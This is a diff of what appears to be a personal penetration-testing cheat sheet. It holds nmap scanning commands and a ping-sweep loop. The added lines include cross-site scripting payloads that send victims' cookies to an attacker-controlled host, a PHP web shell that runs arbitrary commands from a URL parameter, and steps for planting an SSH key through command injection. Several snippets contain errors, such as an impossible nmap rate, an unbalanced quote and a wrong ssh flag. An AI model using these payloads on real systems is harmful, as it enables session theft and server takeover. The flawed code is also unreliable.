@@ -26,7 +26,7 @@ host enum:
 nmap -Pn -T4 --min--rate 32479827348441 10.50.27.95 -p22,80,8080,2222,4444
 
 ping sweep: 
-for i in {1..254};do ping (ping -c 192.168.1.$i | grep "bytes from" &); done 
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
 
 
 nmap scripts: 
@@ -35,19 +35,38 @@ nmap scripts:
 --script=smb-os-discovery 
 --script
 
+run on op station 
+<script>document.location="http://OPIP:8000"+document.cookie;</script> 
+python3 -m http.server
+
+
+
+
+<script> document.location="http://SEVERIP/uploads/cookie_stealer.php? username ="+document.cookie;</script> 
 
 
 
 
 
 
+<HTML><BODY> 
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd"> 
+<INPUT TYPE="submit" VALUE="send"> 
+</FORM> 
+<?php 
+if($_GET['cmd']) {
+system($_GET['cmd])
+} 
+?>
+</pre> 
+</BODY></HTML> 
 
 
 
-
-
-
-
+ssh-keygen -t rsa -b 4096 
+upload public key to .ssh via command injection 
+ssh -I ~/.ssh/id_rsa WWWDATA@ip 
 
 
 
